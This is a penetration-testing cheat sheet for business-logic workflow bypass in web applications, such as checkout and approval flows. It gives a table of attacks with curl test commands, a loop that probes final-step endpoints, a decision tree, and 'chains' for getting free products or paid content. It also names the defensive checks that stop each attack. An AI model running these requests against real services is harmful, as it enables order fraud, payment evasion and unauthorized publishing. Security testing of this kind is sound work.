# WORKFLOW BYPASS — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Skip Step** | Multi-step checkout | `curl -X POST /order/confirm -d '{"step":"payment"}'` without adding items | Order created with $0 total | "Cart empty" validation |
| **Reverse Order** | Steps can be reordered | `curl -X POST /order/payment` then `curl -X POST /order/shipping` (reversed) | Payment processed without shipping | Step order enforced |
| **Status Manipulation** | status field editable | `curl -X PUT /order/1 -d '{"status":"completed"}'` | Order marked complete without payment | Status transitions validated |
| **Reapply Step** | Step runs multiple times | `curl -X POST /order/discount -d '{"code":"WELCOME20"}'` ×2 | Discount applied twice | "already applied" |
| **Skip Payment** | payment step = 0 amount | Set all items to $0, skip payment step | Order created, no charge | Payment gateway check |
| **Direct Final** | POST to final step | `curl -X POST /api/workflow/publish -d '{"content":"test"}'` without review | Published without approval | State machine validation |

## CURL COMMANDS
```bash
# Map the workflow (capture legitimate flow first)
# Then skip steps:
curl -X POST /api/orders/checkout -H "Cookie: A" \
  -d '{"items":[],"coupon":"FREE100","payment":{"method":"none"}}'

# Status manipulation
curl -X PUT /api/orders/123 -H "Cookie: A" \
  -d '{"status":"shipped","tracking":"FAKE123"}'

# Direct endpoint access (bypass intermediate steps)
for step in confirm publish approve finalize checkout complete; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "/api/order/$step" -b "session=A")
  echo "$step → $code"
done

# Reverse workflow: do step 3 before step 2
curl -X POST /api/workflow/approve -d '{"id":123}' -b "session=A"
curl -X POST /api/workflow/submit -d '{"id":123}' -b "session=A"  # Should be before approve
```

## DECISION TREE
```
Found multi-step workflow?
├─ Can POST directly to final step?
│  ├─ 200 + success → BYPASS (skip all intermediate)
│  └─ 400 → state machine enforced
├─ Can modify status directly?
│  ├─ Status changes → STATE MANIPULATION
│  └─ Status ignored/validated → transitions enforced
├─ Can repeat a step?
│  ├─ Effect multiplies → REAPPLY (discount, refund, bonus)
│  └─ "Already completed" → idempotent
└─ Can reverse step order?
   ├─ Works → ORDER VIOLATION
   └─ Server expects sequence → valid state machine
```

## CHAIN
Workflow Bypass + Payment Abuse = Free products
Workflow Bypass + Status Manipulation = Access paid content
